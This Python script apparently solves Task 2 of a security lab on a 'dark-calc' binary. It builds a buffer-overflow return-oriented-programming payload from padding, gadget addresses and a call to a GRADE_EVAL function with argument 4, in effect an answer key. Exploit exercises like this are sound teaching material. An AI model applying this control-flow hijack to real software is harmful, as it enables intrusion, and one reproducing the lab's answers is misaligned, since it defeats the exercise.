#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x401C93
RET = 0x401AC2
GRADE_EVAL = 0x401A87

payload = (
    b"A" * 16
    + p64(RET)
    + p64(POP_RDI_RET)
    + p64(4)
    + p64(GRADE_EVAL)
)

sys.stdout.buffer.write(payload)
